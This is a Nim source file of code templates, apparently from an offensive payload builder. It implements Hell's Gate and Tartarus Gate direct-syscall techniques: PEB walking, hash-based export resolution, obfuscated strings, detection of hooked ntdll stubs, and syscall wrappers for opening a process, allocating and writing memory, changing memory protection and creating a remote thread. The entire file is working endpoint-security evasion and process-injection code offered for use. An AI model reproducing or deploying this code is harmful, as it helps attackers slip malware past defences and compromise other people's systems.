
let DInvokeGetModuleHandleADelegate* = """

type
  GetModuleHandleA_t* = proc(lpModuleName: LPCSTR): HMODULE {.stdcall.}

const
  GetModuleHandleA_HASH * = obf("GetModuleHandleA")

var MyGetModuleHandleA*: GetModuleHandleA_t

MyGetModuleHandleA = cast[GetModuleHandleA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetModuleHandleA_HASH, 0, FALSE)))

"""

let HellsgateAllocDelegate*  = """

proc NtAllocateVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

var 
  ntAllocfuncHash        : uint64            = djb2_hash(obf("NtAllocateVirtualMemory"))
  ntAllocTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntAllocfuncHash)
"""

let HellsgateNtOpenProcessDelegate*  = """

proc NtOpenProcess(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

var 
  ntOpenfuncHash        : uint64            = djb2_hash(obf("NtOpenProcess"))
  ntOpenTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntOpenfuncHash)

"""

let HellsgateWriteDelegate*  = """


proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

var 
  ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
  ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)

"""

let HellsgateProtectDelegate*  = """


proc NtProtectVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

var 
  ntProtectfuncHash        : uint64            = djb2_hash(obf("NtProtectVirtualMemory"))
  ntProtectTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntProtectfuncHash)

"""

let HellsgateNtCreateThreadExDelegate*  = """

type
  PS_ATTR_UNION* {.pure, union.} = object
    Value*: ULONG
    ValuePtr*: PVOID
  PS_ATTRIBUTE* {.pure.} = object
    Attribute*: ULONG 
    Size*: SIZE_T
    u1*: PS_ATTR_UNION
    ReturnLength*: PSIZE_T
  PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
  PS_ATTRIBUTE_LIST* {.pure.} = object
    TotalLength*: SIZE_T
    Attributes*: array[2, PS_ATTRIBUTE]
  PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST
  KNORMAL_ROUTINE* {.pure.} = object
    NormalContext*: PVOID
    SystemArgument1*: PVOID
    SystemArgument2*: PVOID
  PKNORMAL_ROUTINE* = ptr KNORMAL_ROUTINE

proc NtCreateThreadEx(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

var 
  ntCreatefuncHash        : uint64            = djb2_hash(obf("NtCreateThreadEx"))
  ntCreateTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntCreatefuncHash)

"""

let HellsgateNtCloseDelegate*  = """


proc NtClose(Handle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

var 
  ntClosefuncHash        : uint64            = djb2_hash(obf("NtClose"))
  ntCloseTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntClosefuncHash)

"""


let HellsgateStub*  = """

when defined(Hellsgate):

    from os import paramStr
    from random import randomize,rand

    randomize()
    
    {.passC:"-masm=intel".}
    
        #[
            Windows Undocumented Structures - Windows 7+
        ]#
    var 
        syscallJumpAddress: ByteAddress
    
    type
        # https://doxygen.reactos.org/d3/d71/struct__ASSEMBLY__STORAGE__MAP__ENTRY.html
        ASSEMBLY_STORAGE_MAP {.pure.} = object
            Flags*      : ULONG
            DosPath*    : UNICODE_STRING
            Handle*     : HANDLE
        PASSEMBLY_STORAGE_MAP* = ptr ASSEMBLY_STORAGE_MAP
    
        LDR_DLL_LOAD_REASON* {.pure.} = enum
            LoadReasonUnknown                       = -1
            LoadReasonStaticDependency              = 0
            LoadReasonStaticForwarderDependency     = 1
            LoadReasonDynamicForwarderDependency    = 2
            LoadReasonDelayloadDependency           = 3
            LoadReasonDynamicLoad                   = 4
            LoadReasonAsImageLoad                   = 5
            LoadReasonAsDataLoad                    = 6
            LoadReasonEnclavePrimary                = 7
            LoadReasonEnclaveDependency             = 8
    
        RTL_BALANCED_NODE_STRUCT1* {.pure.} = object
            Left* : PRTL_BALANCED_NODE
            Right* : PRTL_BALANCED_NODE
    
        RTL_BALANCED_NODE_UNION1* {.pure, union.} = object
            Children* : array[2, PRTL_BALANCED_NODE]
            Struct1*  : RTL_BALANCED_NODE_STRUCT1
    
        RTL_BALANCED_NODE_UNION2* {.pure, union.} = object
            Red*        {.bitsize:1.}   : UCHAR
            Balance*    {.bitsize:2.}   : UCHAR
            ParentValue*                : ULONG_PTR
    
        RTL_BALANCED_NODE* {.pure.} = object
            Union1* : RTL_BALANCED_NODE_UNION1
            Union2* : RTL_BALANCED_NODE_UNION2
        PRTL_BALANCED_NODE* = ptr RTL_BALANCED_NODE
    
        LDR_DATA_TABLE_ENTRY_UNION_ONE* {.pure, union.} = object
            InInitializationOrderLinks*  : LIST_ENTRY
            InProgressLinks*             : LIST_ENTRY
        PLDR_DATA_TABLE_ENTRY_UNION_ONE* = ptr LDR_DATA_TABLE_ENTRY_UNION_ONE
    
        LDR_DATA_TABLE_ENTRY_STRUCT_ONE* {.pure.} = object
            PackagedBinary* {.bitsize:1.}           : ULONG
            MarkedForRemoval* {.bitsize:1.}         : ULONG
            ImageDll* {.bitsize:1.}                 : ULONG
            LoadNotificationSent* {.bitsize:1.}     : ULONG
            TelemetryEntryProcessed* {.bitsize:1.}  : ULONG
            ProcessStaticImport* {.bitsize:1.}      : ULONG
            InLegacyLists* {.bitsize:1.}            : ULONG
            InIndexes* {.bitsize:1.}                : ULONG
            ShimDll* {.bitsize:1.}                  : ULONG
            InExceptionTable* {.bitsize:1.}         : ULONG
            ReservedFlags1* {.bitsize:2.}           : ULONG
            LoadInProgress* {.bitsize:1.}           : ULONG
            LoadConfigProcessed* {.bitsize:1.}      : ULONG
            EntryProcessed* {.bitsize:1.}           : ULONG
            ProtectDelayLoad* {.bitsize:1.}         : ULONG
            ReservedFlags3* {.bitsize:2.}           : ULONG
            DontCallForThreads* {.bitsize:1.}       : ULONG
            ProcessAttachCalled* {.bitsize:1.}      : ULONG
            ProcessAttachFailed* {.bitsize:1.}      : ULONG
            CorDeferredValidate* {.bitsize:1.}      : ULONG
            CorImage* {.bitsize:1.}                 : ULONG
            DontRelocate {.bitsize:1.}              : ULONG
            CorILOnly* {.bitsize:1.}                : ULONG
            ChpeImage* {.bitsize:1.}                : ULONG
            ReservedFlags5* {.bitsize:2.}           : ULONG
            Redirected* {.bitsize:1.}               : ULONG
            ReservedFlags6* {.bitsize:2.}           : ULONG
            CompatDatabaseProcessed* {.bitsize:1.}  : ULONG
    
        LDR_DATA_TABLE_ENTRY_UNION_TWO* {.pure, union.} = object
            FlagGroup*   : array[4, UCHAR]
            Flags*       : ULONG
            Struct*      : LDR_DATA_TABLE_ENTRY_STRUCT_ONE            
        PLDR_DATA_TABLE_ENTRY_UNION_TWO* = ptr LDR_DATA_TABLE_ENTRY_UNION_TWO
        
    
        PEB_LDR_DATA* {.pure.} = object
            Length*                             : ULONG
            Initialized*                        : BOOLEAN
            SsHandle*                           : PVOID
            InLoadOrderModuleList*              : LIST_ENTRY
            InMemoryOrderModuleList*            : LIST_ENTRY
            InInitializationOrderModuleList*    : LIST_ENTRY
            EntryInProgress*                    : PVOID
            ShutdownInProgress*                 : BOOLEAN
            ShutdownThreadId*                   : HANDLE
        PPEB_LDR_DATA* = ptr PEB_LDR_DATA
    
        PEB* {.pure.} = object
            InheritedAddressSpace*                  : BOOLEAN
            ReadImageFileExecOptions*               : BOOLEAN
            BeingDebugged*                          : BOOLEAN
            PebUnion1*                              : UCHAR
            Padding0*                               : array[4, UCHAR]
            Mutant*                                 : HANDLE
            ImageBaseAddress*                       : PVOID
            Ldr*                                    : PPEB_LDR_DATA                             
            ProcessParameters*                      : PRTL_USER_PROCESS_PARAMETERS  
            SubSystemData*                          : PVOID                         
            ProcessHeap*                            : HANDLE                        
            FastPebLock*                            : PVOID          # PRTL_CRITICAL_SECTION
            AtlThunkSListPtr*                       : PVOID                         
            IFEOKey*                                : PVOID                         
            PebUnion2*                              : ULONG                         
            Padding1*                               : array[4, UCHAR]               
            KernelCallBackTable*                    : ptr PVOID                     
            SystemReserved*                         : ULONG                         
            AltThunkSListPtr32*                     : ULONG                         
            ApiSetMap*                              : PVOID                         
            TlsExpansionCounter*                    : ULONG                         
            Padding2*                               : array[4, UCHAR]               
            TlsBitmap*                              : PVOID                         
            TlsBitmapBits*                          : array[2, ULONG]               
            ReadOnlyShareMemoryBase*                : PVOID                         
            SharedData*                             : PVOID                         
            ReadOnlyStaticServerData*               : ptr PVOID                     
            AnsiCodePageData*                       : PVOID                         
            OemCodePageData*                        : PVOID                         
            UnicodeCaseTableData*                   : PVOID                         
            NumberOfProcessors*                     : ULONG                         
            NtGlobalFlag*                           : ULONG                         
            CriticalSectionTimeout*                 : LARGE_INTEGER                 
            HeapSegmentReserve*                     : ULONG_PTR                     
            HeapSegmentCommit*                      : ULONG_PTR                     
            HeapDeCommitTotalFreeThreshold*         : ULONG_PTR                     
            HeapDeCommitFreeBlockThreshold*         : ULONG_PTR                     
            NumberOfHeaps*                          : ULONG                         
            MaximumNumberOfHeaps*                   : ULONG                         
            ProcessHeaps*                           : ptr PVOID                     
            GdiSharedHandleTable*                   : PVOID                         
            ProcessStarterHelper*                   : PVOID                         
            GdiDCAttributeList*                     : ULONG                         
            Padding3*                               : array[4, UCHAR]               
            LoaderLock*                             : PVOID           # PRTL_CRITICAL_SECTION
            OSMajorVersion*                         : ULONG
            OSMinorVersion*                         : ULONG
            OSBuildNumber*                          : USHORT
            OSCSDVersion*                           : USHORT
            OSPlatformId*                           : ULONG
            ImageSubsystem*                         : ULONG
            ImageSubsystemMajorVersion*             : ULONG
            ImageSubsystemMinorVersion*             : ULONG
            Padding4                                : array[4, UCHAR]
            ActiveProcessAffinityMask*              : PVOID            # KAFFINITY
            GdiHandleBuffer                         : array[0x3c, ULONG]
            PostProcessInitRoutine*                 : VOID
            TlsExpansionBitmap*                     : PVOID
            TlsExpansionBitmapBits*                 : array[0x20, ULONG]
            SessionId*                              : ULONG
            Padding5*                               : array[4, UCHAR]
            AppCompatFlags*                         : ULARGE_INTEGER
            AppCompatFlagsUser*                     : ULARGE_INTEGER
            ShimData*                               : PVOID
            AppCompatInfo*                          : PVOID
            CSDVersion*                             : UNICODE_STRING
            ActivationContextData*                  : PVOID             # PACTIVATION_CONTEXT_DATA 
            ProcessAssemblyStorageMap*              : PVOID             # PASSEMBLY_STORAGE_MAP
            SystemDefaultActivationContextData*     : PVOID             # PACTIVATION_CONTEXT_DATA
            SystemAssemblyStorageMap*               : PVOID             # PASSEMBLY_STORAGE_MAP
            MinimumStackCommit*                     : ULONG_PTR
            Sparepointers*                          : array[4, PVOID]
            SpareUlongs*                            : array[5, ULONG]
            WerRegistrationData*                    : PVOID
            WerShipAssertPtr*                       : PVOID
            Unused*                                 : PVOID
            ImageHeaderHash*                        : PVOID
            TracingFlags*                           : ULONG
            CsrServerReadOnlySharedMemoryBase*      : ULONGLONG
            TppWorkerpListLock*                     : ULONG
            TppWorkerpList*                         : LIST_ENTRY
            WaitOnAddressHashTable*                 : array[0x80, PVOID]
            TelemtryCoverageHeader*                 : PVOID
            CloudFileFlags*                         : ULONG
            CloudFileDiagFlags*                     : ULONG
            PlaceholderCompatabilityMode*           : CHAR
            PlaceholderCompatabilityModeReserved*   : array[7, CHAR]
            LeapSecondData*                         : PVOID
            LeapSecondFlags*                        : ULONG
            NtGlobalFlag2*                          : ULONG
        PPEB* = ptr PEB
    
        TEB* {.pure.} = object
            NtTib*                                  : NT_TIB
            EnvironmentPointer*                     : PVOID
            ClientId*                               : CLIENT_ID
            ActiveRpcHandle*                        : PVOID
            ThreadLocalStoragePointer*              : PVOID
            ProcessEnvironmentBlock*                : PEB
            LastErrorValue*                         : ULONG
            CountOfOwnedCriticalSections*           : ULONG
            CsrClientThread*                        : PVOID
            Win32ThreadInfo*                        : PVOID
            User32Reserved*                         : array[0x1A, ULONG]
            UserReserved*                           : array[5, ULONG]
            WOW32Reserved*                          : PVOID
            CurrentLocale*                          : ULONG
            FpSoftwareStatusRegister*               : ULONG
            ReservedForDebuggerInstrumentation*     : array[0x10, PVOID]
        PTEB* = ptr TEB
    
    
    
    
    
    var syscall*  : WORD
    type
        HG_TABLE_ENTRY* = object
            pAddress*    : PVOID
            dwHash*      : uint64
            wSysCall*    : WORD
        PHG_TABLE_ENTRY* = ptr HG_TABLE_ENTRY
    
    proc djb2_hash*(pFuncName : cstring) : uint64 =
    
        var hash : uint64 = 0x5381
    
        for c in pFuncName:
            hash = ((hash shl 0x05) + hash) + cast[uint64](ord(c))
    
        return hash
    
    proc moduleToBuffer*(pCurrentModule : PLDR_DATA_TABLE_ENTRY) : PWSTR =
        return pCurrentModule.FullDllName.Buffer
    
    proc flinkToModule*(pCurrentFlink : LIST_ENTRY) : PLDR_DATA_TABLE_ENTRY =
        return cast[PLDR_DATA_TABLE_ENTRY](cast[ByteAddress](pCurrentFlink) - 0x10)
    
    proc getExportTable*(pCurrentModule : PLDR_DATA_TABLE_ENTRY, pExportTable : var PIMAGE_EXPORT_DIRECTORY) : bool =
    
        let 
            pImageBase : PVOID              = pCurrentModule.DLLBase
            pDosHeader : PIMAGE_DOS_HEADER  = cast[PIMAGE_DOS_HEADER](pImageBase)
            pNTHeader : PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[ByteAddress](pDosHeader) + pDosHeader.e_lfanew)
    
        if pDosheader.e_magic != IMAGE_DOS_SIGNATURE:
            return false
    
        if pNTHeader.Signature != cast[DWORD](IMAGE_NT_SIGNATURE):
            return false
    
        pExportTable = cast[PIMAGE_EXPORT_DIRECTORY](cast[ByteAddress](pImageBase) + pNTHeader.OptionalHeader.DataDirectory[0].VirtualAddress)
    
        return true
    
    proc getTableEntry*(pImageBase : PVOID, pCurrentExportDirectory : PIMAGE_EXPORT_DIRECTORY, tableEntry : var HG_TABLE_ENTRY) : bool =
    
        var 
            cx : DWORD = 0
            numFuncs : DWORD = pCurrentExportDirectory.NumberOfNames
            DOWN = 32
            UP = -32
        let 
            pAddrOfFunctions    : ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfFunctions)
            pAddrOfNames        : ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNames)
            pAddrOfOrdinals     : ptr UncheckedArray[WORD]  = cast[ptr UncheckedArray[WORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNameOrdinals)
    
        while cx < numFuncs:    
            var 
                pFuncOrdinal    : WORD      = pAddrOfOrdinals[cx]
                pFuncName       : cstring    = $(cast[PCHAR](cast[ByteAddress](pImageBase) + pAddrOfNames[cx]))
                funcHash        : uint64    = djb2_hash(pFuncName)
                funcRVA         : DWORD64   = pAddrOfFunctions[pFuncOrdinal]
                pFuncAddr       : PVOID     = cast[PVOID](cast[ByteAddress](pImageBase) + funcRVA)
            
            if funcHash == tableEntry.dwHash:
    
                tableEntry.pAddress = pFuncAddr
                # Not hooked API
                if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3)[] == 0xB8:
                    tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4)[]
                    return true
                # Credit: https://github.com/Haunted-Banshee/ErebusGate/blob/main/ErebusGate.nim
                # Classic hook API 
                # Check the the first byte is 0xe9
                elif cast[PBYTE](cast[ByteAddress](pFuncAddr))[] == 0xE9:
                    for idx in countup(1,500):
                        if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3 + idx * UP)[] == 0xB8:
                            tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4 + (idx * UP))[] + cast[WORD](idx)
                            return true
                        if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3 + idx * DOWN)[] == 0xB8:
                            tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4 + (idx * DOWN))[] - cast[WORD](idx)
                            return true 
                # Tartarus gate from Nim
                # Check the the third is 0xe9
                elif cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3 )[] == 0xE9:
                    for idx in countup(1,500):
                        if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3 + idx * UP)[] == 0xB8:
                            tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4 + (idx * UP))[] + cast[WORD](idx)
                            return true
                        if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3 + idx * DOWN)[] == 0xB8:
                            tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4 + (idx * DOWN))[] - cast[WORD](idx)
                            return true
            inc cx
        return false
    
    proc GetPEBAsm64*(): PPEB {.asmNoStackFrame.} =
        asm ===
            mov rax, qword ptr gs:[0x60]
            ret
        ===
    
    # Credit: https://github.com/eversinc33/BouncyGate/blob/main/HellsGate.nim
    proc getSyscallInstructionAddress(ntdllModuleBaseAddr: PVOID): ByteAddress =
        ## Get The address of a syscall instruction from ntdll to make sure all syscalls go through ntdll
        when defined(verbose):
            echo obf("[*] Resolving syscall...")
        when defined(verbose):
            echo obf("[*] NTDDL Base: ") & $cast[int](ntdllModuleBaseAddr).toHex
        #var
        #    num = rand(75)
        #    count: int = 0
        var offset: UINT = 0
        while true:
            var currByte = cast[PDWORD](ntdllModuleBaseAddr + offset)[]
            if "050F0375" in $currByte.toHex:
                # Random Syscall instead of always the first one
                #if (count == num):
                when defined(verbose):
                    echo obf("[*] Found syscall in ntdll addr ") & $cast[ByteAddress](ntdllModuleBaseAddr + offset).toHex & ": " & $currByte.toHex
                return cast[ByteAddress](ntdllModuleBaseAddr + offset) + sizeof(WORD)
            offset = offset + 1

        when defined(verbose):
            echo obf("[!] Did not find a syscall instruction in ntdll...")
        quit(1)

    proc getNextModule*(flink : var LIST_ENTRY) : PLDR_DATA_TABLE_ENTRY =
        flink = flink.Flink[]
        return flinkToModule(flink)
    
    proc searchLoadedModules*(pCurrentPeb : PPEB, tableEntry : var HG_TABLE_ENTRY) : bool =
        var 
            currFlink       : LIST_ENTRY                = pCurrentPeb.Ldr.InMemoryOrderModuleList.Flink[]
            currModule      : PLDR_DATA_TABLE_ENTRY     = flinkToModule(currFlink)                 
            moduleName      : string
            pExportTable    : PIMAGE_EXPORT_DIRECTORY
        let 
            beginModule = currModule
        
        while true:
    
            moduleName = $moduleToBuffer(currModule)
    
            if moduleName.len() == 0 or moduleName in paramStr(0):            
                currModule = getNextModule(currFlink)
                if beginModule == currModule:
                    break
                continue
            if obf("ntdll") in moduleName.toLower():
                syscallJumpAddress = getSyscallInstructionAddress(currModule.DLLBase)
            
            if not getExportTable(currModule, pExportTable):
                when defined(verbose):
                    echo obf("[-] Failed to get export table...")
                return false
    
            if getTableEntry(currModule.DLLBase, pExportTable, tableEntry):
                return true
            
            currModule = getNextModule(currFlink)
            if beginModule == currModule:
                break
        return false
    
    proc getSyscall*(tableEntry : var HG_TABLE_ENTRY) : bool =
        
        let currentPeb  : PPEB = GetPEBAsm64()
           
        if not searchLoadedModules(currentPeb, tableEntry):
            return false
    
        return true


"""

